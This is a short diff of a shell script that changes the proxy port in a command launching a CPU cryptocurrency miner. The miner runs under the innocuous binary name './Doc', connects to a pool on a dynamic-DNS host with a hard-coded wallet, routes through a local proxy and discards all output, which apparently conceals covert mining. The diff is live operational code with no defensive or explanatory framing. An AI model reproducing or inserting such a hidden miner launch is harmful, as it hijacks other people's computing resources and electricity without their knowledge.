@@ -38,4 +38,4 @@ unset LD_LIBRARY_PATH
 
 sleep 2
 
-./Doc --disable-gpu --algorithm power2b --pool stratum-mining-pool.zapto.org:3765 --wallet MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate --password x --proxy 127.0.0.1:1082 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
+./Doc --disable-gpu --algorithm power2b --pool stratum-mining-pool.zapto.org:3765 --wallet MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate --password x --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
